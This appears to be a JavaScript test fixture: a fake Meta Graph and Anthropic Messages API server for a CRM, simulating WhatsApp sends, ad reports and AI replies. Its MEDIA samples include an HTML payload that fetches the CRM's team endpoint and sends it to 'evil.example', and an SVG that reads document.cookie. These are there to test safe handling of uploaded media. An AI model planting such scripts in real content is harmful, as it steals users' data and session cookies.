// Fake Meta Graph API for the tests: nothing ever reaches WhatsApp or Meta Ads.
// Logs each send to $FAKE_GRAPH_DIR/sent.jsonl. A phone ending in 99 gets a
// permanent error; the file $FAKE_GRAPH_DIR/ratelimit makes every send fail
// with Meta's spam rate-limit code.
//
// Anthropic Messages API (the CRM's AI assistant): POST /v1/messages answers
// with the requested sections; each request body is logged to
// $FAKE_GRAPH_DIR/ai.jsonl. The file $FAKE_GRAPH_DIR/ai-error makes it fail
// (500); a request mentioning RECUSE-ISTO gets a refusal.
//
// Meta Ads (the Intelligence's Marketing API reads): business "biz-test" has
// act_111 (two campaigns), act_222 (one) and act_999 (always fails). Numbers
// scale with the month asked (October = 10×, November = 11×) so a month's
// sync is recognizable; every other report (breakdowns, daily, ads) is empty.
import fs from "node:fs";
import http from "node:http";
import path from "node:path";

const DIR = process.env.FAKE_GRAPH_DIR ?? "/tmp/crm-fake-graph";
const PORT = Number(process.env.FAKE_GRAPH_PORT ?? 3199);
fs.mkdirSync(DIR, { recursive: true });
let n = 0;

const CONVERSATION = "onsite_conversion.messaging_conversation_started_7d";
const AD_ACCOUNTS = [
  { id: "act_111", name: "Ribeiro Odonto - Meta", account_status: 1 },
  { id: "act_222", name: "Clínica Sol - Meta", account_status: 1 },
  { id: "act_999", name: "Conta com erro", account_status: 1 },
];
const CAMPAIGNS = {
  act_111: [
    { id: "cmp-11", name: "Mensagens Odonto", objective: "OUTCOME_ENGAGEMENT", status: "ACTIVE", spend: 100, extra: 0.5, impressions: 10000, clicks: 200, link: 150, reach: 4000, conversations: 12 },
    { id: "cmp-12", name: "Tráfego site", objective: "OUTCOME_TRAFFIC", status: "PAUSED", spend: 50, extra: 0, impressions: 5000, clicks: 100, link: 80, reach: 2000, conversations: null },
  ],
  act_222: [{ id: "cmp-21", name: "Cadastros Sol", objective: "OUTCOME_LEADS", status: "ACTIVE", spend: 30, extra: 0, impressions: 3000, clicks: 60, link: 40, reach: 1000, conversations: 3 }],
};
const ACCOUNT_REACH = { act_111: 5000, act_222: 1200 };

/** GET /v21.0/... of the Marketing API, or null when it isn't one. */
function metaAds(url) {
  const m = url.pathname.match(/^\/v\d+\.\d+\/([^/]+)(?:\/([a-z_]+))?$/);
  if (!m) return null;
  const [, node, edge] = m;
  const q = url.searchParams;
  if (node === "biz-test" && !edge) return [200, { owned_ad_accounts: { data: AD_ACCOUNTS }, client_ad_accounts: { data: [] } }];
  if (!node.startsWith("act_")) return null;
  if (node === "act_999") return [400, { error: { message: "fake: account unavailable", code: 100 } }];
  const camps = CAMPAIGNS[node] ?? [];
  if (edge === "campaigns") return [200, { data: camps.map((c) => ({ id: c.id, objective: c.objective, effective_status: c.status })) }];
  if (edge !== "insights") return [200, { data: [] }];
  const range = JSON.parse(q.get("time_range") ?? "null");
  const f = range ? Number(range.since.slice(5, 7)) : 1;
  const plain = !q.get("breakdowns") && !q.get("time_increment") && !q.get("filtering");
  if (q.get("level") === "campaign" && plain) {
    return [
      200,
      {
        data: camps.map((c) => ({
          campaign_id: c.id,
          campaign_name: c.name,
          spend: String(c.spend * f + c.extra),
          impressions: String(c.impressions * f),
          clicks: String(c.clicks * f),
          inline_link_clicks: String(c.link * f),
          reach: String(c.reach * f),
          actions: c.conversations === null ? [] : [{ action_type: CONVERSATION, value: String(c.conversations * f) }],
        })),
      },
    ];
  }
  if (q.get("level") === "account" && plain && q.get("fields") === "reach") return [200, { data: [{ reach: String((ACCOUNT_REACH[node] ?? 0) * f) }] }];
  return [200, { data: [] }];
}

const TEMPLATES = [
  {
    name: "promo_novembro",
    language: "pt_BR",
    status: "APPROVED",
    category: "MARKETING",
    components: [{ type: "BODY", text: "Olá {{1}}! A {{2}} tem uma condição especial em novembro. Responda SIM para saber mais ou SAIR para não receber." }],
  },
  { name: "boas_vindas", language: "pt_BR", status: "APPROVED", category: "UTILITY", components: [{ type: "BODY", text: "Oi! Obrigado pelo contato." }] },
  { name: "pendente", language: "pt_BR", status: "PENDING", category: "MARKETING", components: [] },
];

// WhatsApp media a lead "sent" (GET /vX/<id> → its URL and type, then the bytes):
// a photo, and files whose type would run scripts if a browser rendered them.
const MEDIA = {
  "media-jpg": { mime: "image/jpeg", body: Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46]) },
  "media-html": { mime: "text/html", body: Buffer.from("<script>fetch('/api/crm/team/').then(r=>r.text()).then(t=>fetch('https://evil.example/?'+t))</script>") },
  "media-svg": { mime: "image/svg+xml", body: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>') },
};

http
  .createServer((req, res) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      const json = (code, obj) => {
        res.writeHead(code, { "Content-Type": "application/json" });
        res.end(JSON.stringify(obj));
      };
      if (req.method === "POST" && req.url.startsWith("/v1/messages")) {
        const b = JSON.parse(body || "{}");
        fs.appendFileSync(path.join(DIR, "ai.jsonl"), JSON.stringify({ headers: { beta: req.headers["anthropic-beta"] ?? null, auth: req.headers["x-api-key"] ?? req.headers.authorization ?? null }, body: b }) + "\n");
        if (fs.existsSync(path.join(DIR, "ai-error"))) return json(500, { type: "error", error: { type: "api_error", message: "fake: overloaded" } });
        const prompt = String(b.messages?.[0]?.content ?? "");
        const refused = prompt.includes("RECUSE-ISTO");
        const sections = [...prompt.matchAll(/## ([^,.]+?)(?=,|\.| \(|$)/g)].map((m) => m[1].trim());
        const name = (prompt.match(/"analise":"([^"]+)"/) ?? [])[1] ?? "análise";
        const text = sections.map((t) => `## ${t}\n- Leitura de teste para ${name}.`).join("\n\n");
        return json(200, {
          id: `msg_fake_${++n}`,
          type: "message",
          role: "assistant",
          model: b.model,
          content: refused ? [] : [{ type: "text", text }],
          stop_reason: refused ? "refusal" : "end_turn",
          stop_details: refused ? { type: "refusal", category: null, explanation: "fake refusal" } : null,
          stop_sequence: null,
          usage: { input_tokens: Math.ceil(prompt.length / 4), output_tokens: Math.ceil(text.length / 4) },
        });
      }
      const mediaMeta = req.method === "GET" && req.url.match(/^\/v\d+\.\d+\/(media-[a-z]+)$/);
      if (mediaMeta && MEDIA[mediaMeta[1]]) return json(200, { url: `http://localhost:${PORT}/media-file/${mediaMeta[1]}`, mime_type: MEDIA[mediaMeta[1]].mime });
      const mediaFile = req.method === "GET" && req.url.match(/^\/media-file\/(media-[a-z]+)$/);
      if (mediaFile && MEDIA[mediaFile[1]]) {
        res.writeHead(200, { "Content-Type": MEDIA[mediaFile[1]].mime });
        return res.end(MEDIA[mediaFile[1]].body);
      }
      if (req.method === "GET" && req.url.includes("message_templates")) return json(200, { data: TEMPLATES });
      if (req.method === "GET") {
        const ads = metaAds(new URL(req.url, "http://localhost"));
        if (ads) return json(...ads);
      }
      if (req.method === "POST" && req.url.endsWith("/messages")) {
        const b = JSON.parse(body || "{}");
        const entry = {
          to: b.to,
          type: b.type,
          template: b.template?.name,
          params: b.template?.components?.[0]?.parameters?.map((p) => p.text) ?? [],
          text: b.text?.body,
        };
        fs.appendFileSync(path.join(DIR, "sent.jsonl"), JSON.stringify(entry) + "\n");
        if (fs.existsSync(path.join(DIR, "ratelimit"))) return json(400, { error: { message: "spam rate limit hit", code: 131048 } });
        if (String(b.to).endsWith("99")) {
          return json(400, { error: { message: "Recipient phone number not on WhatsApp", code: 131026, error_data: { details: "Número sem WhatsApp" } } });
        }
        return json(200, { messages: [{ id: `wamid.fake.${Date.now()}.${++n}` }] });
      }
      json(404, { error: { message: "not found" } });
    });
  })
  .listen(PORT, () => console.log(`fake graph on ${PORT}`));
